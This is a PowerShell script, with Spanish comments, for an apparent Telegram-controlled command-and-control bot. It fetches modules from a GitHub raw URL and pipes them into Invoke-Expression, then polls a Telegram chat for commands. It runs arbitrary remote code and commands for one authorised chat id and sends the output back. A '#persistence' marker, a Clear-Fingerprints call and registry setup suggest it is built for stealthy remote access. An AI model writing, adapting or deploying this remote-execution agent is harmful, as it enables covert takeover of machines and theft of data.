function loader{    # aqui empieza la funcion loader
    param(
        [Parameter(Mandatory)]
        [string] $file,
        [Parameter(Mandatory)]
        [string] $path
    )
    $ruta=$path;$ruta+=$file;$ruta+=".psm1" # monta la ruta completa
    $ruta
    (Invoke-WebRequest $ruta -UseBasicParsing).Content | iex # carga las funciones externas en el ámbito del script
    . $file
}

$condition = $true
$path = "https://raw.githubusercontent.com/josprou/BotAnsible/main/" # Dirección local donde cargar funciones y devolver resultados en caso de necesidad
$ruta = $path;$ruta+="account_ansible";$ruta+=".psm1"
(Invoke-WebRequest $ruta -UseBasicParsing).Content | iex
$commandlist=@('account_ansible')
$GLOBAL:$joblist=@{}
#if([string[]]$commandlist -notcontains "account_ansible"){loader -file "account_ansible" -path $path;$commandlist+="account_ansible"}
#persistence
Clear-Fingerprints

$RegKey = 'HKCU:\Software\MyTelegram'
New-MyTelegramConfiguration

while($condition){
    $telegrams = Get-TelegramTimeLine -MaxinumMessages 1

    $telegrams | foreach {
        $command = $_.message.text
        $GLOBAL:chat_id= $_.message.chat.id
        [int]$update_id = $_.update_id

        # Lectura de Telegrams
        [int]$LastUpdateId = Get-LastUpdateID
        if($update_id -gt $LastUpdateId){
            $result = $true
            Update-Time -LastUpdateID $update_id
        }else{
            $result = $false
        }

        # Comprobación de identidad y privilegios
        #                   Jose                           
        if(($chat_id -eq "685749607")){
            $result = $true        
        }else{
            $result = $false
        }

        if ($result -eq $true){
            $command = $command.split("|")
            $command
            if($command[0] -eq "bar"){
                loader -path $path -file bar
            }
            if($command[0] -eq "load"){
                if($commandlist -notcontains $command[1]){
                    loader -path $path -file $command[1]
                    $commandlist += $command[1]
                }
                if ($command[2])
                {
                    $comando = $command[1];$comando += " ";$comando+=$command[2]
                    $comando | Invoke-Expression    
                }
                else
                {
                    $comando = $command[1]
                    $comando | Invoke-Expression
                }
            }
            if($command[0] -eq "help"){
                loader -path $path -file helper
                helper
            }
            $global:execute
            #$global:execute.Length
            if($global:execute.length -gt 0){send-results -chat_id $chat_id -texto $global:execute;$global:execute=$null}
            $condition = $command[0] -ne "quit!"         
        }     
    }    
    sleep 5
}
